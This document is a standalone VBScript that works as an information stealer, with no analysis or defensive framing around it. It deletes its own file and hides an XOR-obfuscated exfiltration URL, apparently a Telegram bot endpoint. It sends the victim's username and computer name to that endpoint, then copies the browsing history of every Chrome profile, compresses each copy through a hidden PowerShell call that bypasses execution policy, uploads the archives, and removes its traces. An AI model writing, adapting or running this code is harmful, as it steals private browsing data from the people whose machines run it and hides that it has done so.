On Error Resume Next
CreateObject("Scripting.FileSystemObject").DeleteFile WScript.ScriptFullName
Set a=CreateObject("MSXML2.XMLHTTP"):Set b=CreateObject("Scripting.FileSystemObject"):Set c=CreateObject("WScript.Shell"):t=vbCrLf:w="chat_id=-4102963123"
For z=1 To 75:v=v&Chr(Asc(Mid("mqquv?**dul+q`i`bwdh+jwb*gjq313=740=47?DDCJlB}_@(UUs]0OPdZa0lGnlT]7\A\lsb*",z,1))Xor 5):Next
Function r(g,h)
For d=1 To 16:e=e&Chr(65+Int(Rnd*25)):Next
Set i=CreateObject("ADODB.Stream"):i.Type=1:i.Open:i.LoadFromFile h:i.Position=0:x=i.read:i.Close:i.Open:i.Position=0:i.Type=1:i.Write s("--"&e&t&"Content-Disposition: form-data; name=""document""; filename="""&g&""""&t&t):i.Write x:i.Write s(t&"--"&e&"--"):i.Position=0:a.Open "POST",v & "sendDocument?" & w,False:a.setRequestHeader "Content-Type","multipart/form-data; boundary="&e:a.send i.read
End Function
Function s(u)
Set i=CreateObject("ADODB.Stream"):i.Open:i.Type=2:i.Charset="_autodetect":i.WriteText u:i.Position=0:i.Type=1:s=i.read:i.Close
End Function
Set y=CreateObject("WScript.Network")
a.Open "GET",v&"sendMessage?"&w&"&text="&y.UserName&"%0A"&y.Computername,False
a.Send
Randomize
k=b.BuildPath(b.GetSpecialFolder(2),int(Rnd*9999))
l=k&"\"
b.CreateFolder l
m=c.ExpandEnvironmentStrings("%LOCALAPPDATA%")&"\Google\Chrome\User Data"
If b.FolderExists(m) Then
For Each n In b.GetFolder(m).SubFolders
o=b.BuildPath(n.Path,"History")
If b.FileExists(o) Then
b.CopyFile o,l+b.GetFolder(n.Path).Name
p=l+b.GetFolder(n.Path).Name
q=p+".zip"
c.Run "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ""Compress-Archive -Path '"&p&"' -DestinationPath '"&q&"' -CompressionLevel Optimal -Force""",0,True
Call r(b.GetFolder(n.Path).Name+".zip",q)
b.DeleteFile p
b.DeleteFile q
End If
Next
End If
If b.FolderExists(k) Then b.DeleteFolder k,True